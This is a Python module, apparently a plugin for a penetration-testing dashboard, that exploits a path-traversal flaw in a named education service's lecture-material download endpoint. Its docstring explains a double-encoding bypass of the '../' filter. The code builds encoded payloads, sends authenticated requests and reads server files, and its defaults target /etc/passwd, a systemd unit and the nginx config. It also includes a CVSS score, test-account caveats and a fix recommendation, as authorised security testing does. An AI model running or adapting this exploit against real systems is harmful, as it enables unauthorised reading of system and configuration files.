"""강의 자료 다운로드 경로 조작 — 읽고 싶은 경로를 넣으면 페이로드를 만들어 보낸다.

대상: GET /backend/lectures/{강의번호}/material/download?file=
원인: resolve() 가 '../ 제거'를 URL 디코딩보다 먼저 하고, 탈출 검사를 getAbsolutePath() 로 한다.
      그래서 한 번 더 감싸 두면 제거를 지나친 뒤 디코딩되어 ../ 로 되살아난다.
      (11-01 코드 분석 → 11-03 실측, CVSS 6.5)

로그인이 필요하다. 대상 탭의 인증 헤더에 'Authorization: Bearer ...' 를 넣어 두면
이 대상으로 가는 요청에만 자동으로 붙는다.
"""
from dashboard.core import Finding, ToolResult, fetch
from dashboard.payloads import ENCODINGS, traversal

META = {
    "id": "sesacedu_material_traversal",
    "name": "자료 다운로드 경로 조작",
    "category": "경로 조작",
    # 로그인한 사용자가 저장소 밖 파일을 읽는다
    "cvss": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N",
    # 노션 '웹 서비스 취약점 목록' 의 취약점 유형 — 저장 폴더 밖의 파일을 읽어 오는 것
    "vuln": "FILE",
    "kind": "active",
    "roles": ["user_web", "practice"],  # 이 역할의 대상에서만 보인다
    "stage": "tool",
    "severity": "high",
    "attack": [
        {"tactic": "TA0007", "technique": "T1083", "name": "File and Directory Discovery"},
        {"tactic": "TA0009", "technique": "T1005", "name": "Data from Local System"},
    ],
    "description": "읽을 경로를 한 줄에 하나씩 넣으면 인코딩해 보내고 응답 코드를 보여 줍니다. 한 줄만 넣으면 내용까지 보여 줍니다.",
    "needs": [
        {"kind": "auth_header", "name": "Authorization",
         "why": "강의 자료는 로그인한 사용자만 내려받을 수 있어, 토큰이 없으면 전부 401 로 돌아옵니다",
         "how": "대상 탭에서 그 대상의 '인증 헤더' 에 Authorization: Bearer <토큰> 을 한 줄 넣습니다. 테스트 계정 토큰만 쓰세요"},
        {"kind": "account", "required": False,
         "why": "남의 계정 토큰으로 돌리면 그 사람 권한으로 요청이 나갑니다",
         "how": "테스트 계정으로 로그인해 받은 토큰을 씁니다"},
    ],
    "params": [
        {"name": "paths", "label": "읽을 경로 (한 줄에 하나)", "type": "textarea",
         "default": "etc/passwd\netc/systemd/system/sesacedu-api.service\netc/nginx/sites-enabled/default",
         "help": "맨 앞 / 는 빼고 씁니다. 여러 줄을 넣으면 어느 것이 있는지 응답 코드로 먼저 확인합니다."},
        {"name": "scheme", "label": "인코딩", "type": "select", "default": "double-full",
         "options": [{"value": k, "label": v} for k, v in ENCODINGS.items()],
         "help": "서버가 ../ 를 지우고 나서 디코딩하는 순서라서 한 번 더 감싼 형태가 통합니다."},
        {"name": "depth", "label": "올라갈 단계", "type": "int", "default": "9",
         "help": "저장 폴더에서 위로 몇 번 올라갈지. 넉넉히 줘도 최상위에서 멈춥니다."},
        {"name": "lecture", "label": "강의 번호", "default": "123"},
    ],
}

PATH = "/backend/lectures/{lecture}/material/download?file={payload}"
MAX_PATHS = 40
PREVIEW = 4000


def run(target, params):
    paths = [p.strip().lstrip("/") for p in params.get("paths", "").splitlines() if p.strip()]
    if not paths:
        raise ValueError("읽을 경로를 한 줄에 하나씩 넣어 주세요")
    if len(paths) > MAX_PATHS:
        raise ValueError(f"한 번에 {MAX_PATHS}개까지 넣을 수 있습니다 (지금 {len(paths)}개)")
    scheme, lecture = params.get("scheme", "double-full"), params.get("lecture", "123")
    depth = int(params.get("depth") or 9)

    rows, drills, hits = [], [], []
    for path in paths:
        payload = traversal(path, depth, scheme)
        url = target.url + PATH.format(lecture=lecture, payload=payload)
        r = fetch(url, record_body=False)   # 읽어 온 파일 내용은 요청 기록에 남기지 않는다
        got = r.status == 200 and len(r.body) > 0
        rows.append([path, r.status, f"{len(r.body):,}" if got else "—",
                     "읽힘" if got else ("없음/차단" if r.status else "연결 실패")])
        drills.append({"내용 보기": {"paths": path}} if got else None)
        if got:
            hits.append((path, r))

    if hits:
        first = hits[0][1]
        finding = [Finding(
            title=f"경로 조작으로 서버 파일 읽기({len(hits)}개 확인)",
            severity="high",
            location=target.url + PATH.format(lecture=lecture, payload="<" + scheme + ">"),
            evidence=(f"인코딩 {scheme} · 올라갈 단계 {depth}\n"
                      + "\n".join(f"{p} → {r.status} ({len(r.body):,}자)" for p, r in hits)),
            recommendation=("경로를 정규화(realpath)한 뒤 저장 폴더 안인지 검사하고, "
                            "URL 디코딩을 먼저 한 번만 한 다음 검사합니다. "
                            "더 나은 방법은 파일 이름을 받지 않고 자료 번호로만 찾는 것입니다."),
            response=first)]
    else:
        finding = []

    # 한 줄만 넣었고 읽혔으면 내용까지 보여 준다
    text = ""
    if len(paths) == 1 and hits:
        body = hits[0][1].body
        text = body[:PREVIEW] + (f"\n… (전체 {len(body):,}자 중 앞 {PREVIEW:,}자)" if len(body) > PREVIEW else "")

    return ToolResult(
        summary=f"{len(paths)}개 중 {len(hits)}개 읽힘 · 인코딩 {ENCODINGS.get(scheme, scheme)}",
        columns=["경로", "응답", "크기", "결과"], rows=rows, drills=drills,
        text=text, findings=finding,
        note="읽기만 합니다. 파일 내용은 화면에만 보이고 요청 기록·DB 에 저장하지 않습니다.")
